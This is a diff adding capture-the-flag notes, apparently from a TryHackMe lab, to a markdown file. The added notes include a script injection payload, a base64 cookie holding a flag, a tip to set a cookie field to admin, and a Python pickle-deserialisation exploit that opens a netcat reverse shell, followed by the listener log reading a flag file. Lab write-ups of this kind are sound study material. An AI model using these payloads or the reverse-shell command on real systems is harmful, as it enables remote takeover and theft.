@@ -260,3 +260,54 @@ https://github.com/search?q=Pensive+Notes
 
 <script>document.getElementById("thm-title").textContent='I am a hacker'</script>
 ```
+
+# day 8
+## 1
+
+- https://tomcat.apache.org/
+
+
+
+# cookie
+- gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAMDMxZTJlZGU4NTYyNGFjZmEyNDExZTlhMDdkNGQ5ZjNxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==
+- change cookie userType to admin
+
+```python
+root@kali:~# cat rce.py
+import pickle
+import sys
+import base64
+
+command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.10.95.180 4444 > /tmp/f'
+
+class rce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+print(base64.b64encode(pickle.dumps(rce())))
+```
+
+
+```
+root@kali:~# nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.95.180] from (UNKNOWN) [10.10.108.140] 59924
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+app.py
+Dockerfile
+index.html
+launch.sh
+__pycache__
+requirements.txt
+static
+templates
+user.html
+venv
+vimexchange.sock
+wsgi.py
+$ find / -name "flag.txt" -type f 2>/dev/null
+/home/cmnatic/flag.txt
+$ cat /home/cmnatic/flag.txt
+```
